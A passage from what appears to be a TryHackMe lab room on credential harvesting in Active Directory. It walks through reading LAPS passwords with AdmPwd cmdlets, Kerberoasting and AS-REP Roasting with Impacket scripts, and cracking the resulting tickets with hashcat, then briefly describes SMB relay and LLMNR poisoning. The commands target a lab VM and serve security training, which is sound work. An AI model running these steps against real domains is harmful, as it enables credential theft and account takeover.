        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">PS C:\Users\thm&gt; Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Next, we need to find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS. We will be using the "Find-AdmPwdExtendedRights" cmdlet to provide the right OU. Note that getting the available OUs could be done in the enumeration step. Our OU target in this example is <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">THMorg</code>. You can use the&nbsp;<code data-pf_style_display="inline-block" data-pf_style_visibility="visible">-Identity *</code>&nbsp; argument to list all available OUs.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Finding Users with AdmPwdExtendedRights Attribute
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">PS C:\Users\thm&gt; Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\THMGroupReader}</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">The output shows that the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">THMGroupReader</code>&nbsp;group in <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">THMorg</code>&nbsp;has the right access to LAPS. Let's check the group and its members.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Finding Users belong to THMGroupReader Group
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">PS C:\Users\thm&gt; net groups "THMGroupReader"
Group name     THMGroupReader
Comment

Members

-------------------------------------------------------------------------------
bk-admin
The command completed successfully.

PS C:\Users\victim&gt; net user test-admin
User name                    test-admin
Full Name                    THM Admin Test Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

[** Removed **]
Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
                             *THMGroupReader           *Enterprise Admins
The command completed successfully.</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Getting the Password</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">We found that the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">bk-admin</code> user is a member of <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">THMGroupReader</code>, so in order to get the LAPS password, we need to compromise or impersonate the bk-admin user. After compromising the right user, we can get the LAPS password using <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">Get-AdmPwdPassword</code> cmdlet by providing the target machine with LAPS enabled.<br data-pf_style_display="inline" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Getting LAPS Password with the Right User
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">PS C:\&gt; Get-AdmPwdPassword -ComputerName creds-harvestin

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword    2/11/2338 11:05:2...</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">It is important to note that in a real-world AD environment, the LAPS is enabled on specific machines only. Thus, you need to enumerate and find the right target computer as well as the right user account to be able to get the LAPS password. There are many scripts to help with this, but we included the <a href="https://github.com/leoloobeek/LAPSToolkit" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">LAPSToolkit</a> PowerShell script in <code data-pf_style_display="inline-block" data-pf_style_visibility="visible"> C:\Tool </code>to try it out.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">Which group has ExtendedRightHolder and is able to read the LAPS password?</p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: **********" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="8" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                Follow the technique discussed in this task to get the LAPS password. What is the LAPs Password for <b data-pf_style_display="inline" data-pf_style_visibility="visible">Creds-Harvestin</b> computer?
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***************" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="8" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <i class="fal fa-lightbulb" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">Which user is able to read LAPS passwords?</p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ********" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="3" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="8" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <i class="fal fa-lightbulb" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-9" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse9" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title red" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 9                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="far fa-circle text-lgray" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Other Attacks
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse9" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-incomplete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible">In the previous tasks, the assumption is that we already had initial access to a system and were trying to obtain credentials from memory or various files within the Windows operating system. In other scenarios, it is possible to perform attacks in a victim network to obtain credentials.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">This task will briefly introduce some of the Windows and AD attacks that can be used to obtain the hashes. Before diving into more AD attack details, we suggest being familiar with&nbsp;<a href="https://en.wikipedia.org/wiki/Kerberos_(protocol)" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Kerberos protocol</a>&nbsp;and&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">New Technology LAN Manager (NTLM), a suite of security protocols used to authenticate users.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Kerberoasting</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Kerberoasting is a common AD attack to obtain AD tickets that helps with persistence. In order for this attack to work, an adversary must have access to SPN&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">(Service Principal Name)&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS). This attack's end goal is to enable privilege escalation and lateral network movement.&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">For more details about the attack, you can visit the THM&nbsp;</span><a href="https://tryhackme.com/room/persistingad" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Persisting AD</a><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">room (Task 3).</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Let's do a quick demo about the attack. First, we need to find an SPN account(s), and then we can send a request to get a TGS ticket. We will perform the&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Kerberoasting&nbsp;attack from the AttackBox</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;using the </span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">GetUserSPNs.py python script.&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Remember to use the</span><span style="font-size:1rem;text-align:center" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em" data-pf_style_display="inline" data-pf_style_visibility="visible">THM.red/thm</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;account with</span><span style="font-size:1rem;text-align:center" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em" data-pf_style_display="inline" data-pf_style_visibility="visible">Passw0rd!</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;as a password.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible"></span></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Enumerating for SPN Accounts</div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token info punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token user" data-pf_style_display="inline" data-pf_style_visibility="visible">user@machine</span></span><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">$</span> <span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm</span></span>
<span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  </span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible">The previous command is straightforward: we provide the Domain Controller IP address and the domain name\username. Then the GetUserSPNs script asks for the user's password to retrieve the required information.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">The output revealed that we have an SPN account, svc-user. Once we find the SPN user, we can send a single request to get a TGS ticket for the srv-user user using the -request-user argument.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Requesting a TGS Ticket as SPN Account
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token info punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token user" data-pf_style_display="inline" data-pf_style_visibility="visible">user@machine</span></span><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">$</span> <span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm -request-user svc-user </span></span>
<span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  

[-] CCache file is not found. Skipping...
</span><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">$</span><span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">krb5tgs<span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$23</span><span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$*</span>svc-user<span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$THM</span>.RED<span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$THM</span>.red/svc-user*<span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$8f5de4211da1cd5715217</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>*REMOVED*<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span>7bfa3680658dd9812ac061c5</span></span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Now, it is a matter of cracking the obtained TGS ticket using the HashCat tool using <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">-m 13100</code> mode as follows,</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Cracking the TGS Ticket using Hashcat
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token info punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token user" data-pf_style_display="inline" data-pf_style_visibility="visible">user@machine</span></span><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">$</span> <span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">hashcat -a <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span> -m <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">13100</span> spn.hash /usr/share/wordlists/rockyou.txt</span></span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"> Try replicating the steps against the attached VM by finding the SPN user and then performing the Kerberoasting attack. Once you have obtained the ticket, crack it and answer the question below.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">AS-REP Roasting</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">AS-REP Roasting is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Do not require Kerberos pre-authentication". This option relies on the old Kerberos authentication protocol, which&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!</span></p><p style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><img src="./TryHackMe _ Credentials Harvesting_files/81bf1dad6425f8f06b0026f4e748f193.png" alt="AS-REP Roasting" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="413" data-pf_rect_height="292" class="pf-large-image"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible"><br data-pf_style_display="inline" data-pf_style_visibility="visible"></span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">The attached VM has one of the AD users configured with the "Do not require Kerberos preauthentication" setting. Before performing the AS-REP Roasting, we need a list of domain accounts that should be gathered from the enumeration step. In our case, we created a </span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">users.lst</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;list in the tmp directory. The following is the content of our list, which should be gathered during the enumeration process.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><pre style="font-size:14px" class=" language-markup" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-markup" data-pf_style_display="inline-block" data-pf_style_visibility="visible">Administrator
admin
thm
test
sshd
victim
CREDS-HARVESTIN$</code></pre><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">We will be using the Impacket Get-NPUsers script this time as follows,</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible"></span></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Performing an AS-REP Roasting Attack against Users List
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token info punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token user" data-pf_style_display="inline" data-pf_style_visibility="visible">root@machine</span></span><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">$</span> <span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txt</span></span>
<span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
</span><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">$</span><span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">krb5asrep<span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$23</span><span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$victim</span>@THM.RED:166c95418fb9dc495789fe9<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>**REMOVED**<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span>1e8d2ef27<span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$6a0e13abb5c99c07</span></span></span>
<span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bk-admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-user doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User thm-local doesn't have UF_DONT_REQUIRE_PREAUTH set</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible">We specified the IP address of the domain controller with the&nbsp;<code data-pf_style_display="inline-block" data-pf_style_visibility="visible">-dc-ip</code> argument and provided a list of domain users to check against. Once the tool finds the right user with no preauthentication configuration, it will generate the ticket.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Various cybersecurity and hacking tools also allow cracking the TGTs harvested from Active Directory, including Rubeus and Hashcat. Impacket GetNPUsers has the option to export tickets as John or hashcat format using the&nbsp;<code data-pf_style_display="inline-block" data-pf_style_visibility="visible">-format</code> argument.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">SMB Relay Attack</span></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">The SMB Relay attack abuses the NTLM authentication mechanism (NTLM challenge-response protocol). The attacker performs a Man-in-the-Middle attack to monitor and capture SMB packets and extract hashes. For this attack to work, the SMB signing must be disabled. SMB signing is a security check for integrity and ensures the communication is between trusted sources.&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible">We suggest checking the THM<a href="https://tryhackme.com/room/exploitingad" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible"> Exploiting AD</a> room for more information about the SMB relay attack.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">LLMNR/</span><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">NBNS</span><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;Poisoning</span></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) help local network machines to find the right machine if DNS fails. For example, suppose a machine within the network tries to communicate with no existing DNS record (DNS fails to resolve). In that case, the machine sends multicast messages to all network machines asking for the correct address via LLMNR or NBT-NS.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">The&nbsp;NBNS/LLMNR Poisoning occurs when an attacker spoofs an authoritative source on the network and responds to the&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) traffic to the requested host with host identification service. If you want to learn more about the attack, we suggest checking THM <a href="https://tryhackme.com/room/breachingad" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Breaching AD</a> room.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">The end goal for SMB relay and&nbsp;LLMNR/NBNS Poisoning attacks is to capture authentication NTLM hashes for a victim, which helps obtain access to the victim's account or machine.&nbsp;</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">Enumerate for SPN users using the Impacket GetUserSPNs script. What is the&nbsp;Service Principal Name for the Domain Controller?</p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *******" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="9" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
